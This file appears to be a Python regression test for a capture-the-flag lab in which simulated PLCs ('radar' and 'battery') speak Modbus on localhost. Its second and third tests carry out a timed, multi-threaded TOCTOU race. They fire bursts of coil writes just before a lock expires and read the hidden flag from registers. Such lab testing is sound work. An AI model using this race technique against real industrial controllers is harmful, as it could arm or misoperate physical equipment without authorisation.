"""
Quick functional/regression test for the plc-battery TOCTOU logic.
Run against a locally-started plc-radar (port 5020) and plc-battery (port 5021).
"""
import sys
import time
import threading

sys.path.insert(0, "/home/claude/interceptor-down/solutions")
from modbus_client_mini import ModbusMiniClient

radar = ModbusMiniClient("127.0.0.1", 5020)
battery = ModbusMiniClient("127.0.0.1", 5021)


def wait_for_lock():
    print("[*] waiting for radar lock...")
    while True:
        locked = radar.read_coils(0, 1)[0]
        if locked:
            print("[*] lock acquired")
            return
        time.sleep(0.1)


def reset_battery_for_test():
    # can't truly reset race_flag via protocol (by design -- it's a
    # server-side-only artifact), so we just note current value before
    # each sub-test for comparison
    return battery.read_registers(11, 1)[0]


print("=== TEST 1: legitimate unlock -> immediate write should NOT set race_flag ===")
wait_for_lock()
before = reset_battery_for_test()
battery.write_coil(1, True)
time.sleep(0.5)
after = battery.read_registers(11, 1)[0]
armed = battery.read_coils(1, 1)[0]
print(f"armed={armed} race_flag before={before} after={after}")
assert armed is True, "expected legitimate arm to succeed"
assert after == before, "FAIL: legitimate immediate write incorrectly set race_flag!"
print("PASS: legitimate write did not trigger race_flag\n")

# disarm for next test
battery.write_coil(1, False)
time.sleep(0.2)

print("=== TEST 2: boundary-timed write SHOULD set race_flag ===")
wait_for_lock()
remaining_ms = radar.read_registers(9, 1)[0]
print(f"[*] lock remaining ~{remaining_ms}ms, timing a burst near expiry")
wait_s = max(0, (remaining_ms - 80) / 1000.0)
time.sleep(wait_s)


def fire_attempt():
    try:
        battery.write_coil(1, True)
    except Exception as e:
        print("write error:", e)


threads = [threading.Thread(target=fire_attempt) for _ in range(10)]
for t in threads:
    t.start()
for t in threads:
    t.join()

time.sleep(0.5)
race_flag = battery.read_registers(11, 1)[0]
print(f"race_flag={race_flag}")
if race_flag == 1:
    regs = battery.read_registers(20, 20)
    flag = "".join(chr(r) for r in regs if r != 0)
    print("PASS: race won, flag registers readable ->", flag)
else:
    print("race not won this attempt (timing-dependent, will retry below)")

print("\n=== TEST 3: retry loop in case of timing jitter ===")
won = race_flag == 1
for attempt in range(8):
    if won:
        break
    battery.write_coil(1, False)
    time.sleep(0.2)
    wait_for_lock()
    remaining_ms = radar.read_registers(9, 1)[0]
    wait_s = max(0, (remaining_ms - 80) / 1000.0)
    time.sleep(wait_s)
    threads = [threading.Thread(target=fire_attempt) for _ in range(15)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    time.sleep(0.5)
    race_flag = battery.read_registers(11, 1)[0]
    print(f"attempt {attempt}: race_flag={race_flag}")
    won = race_flag == 1

print("\nFINAL RESULT: race won =", won)
assert won, "FAIL: never managed to win the TOCTOU race across retries"
print("ALL TESTS PASSED")
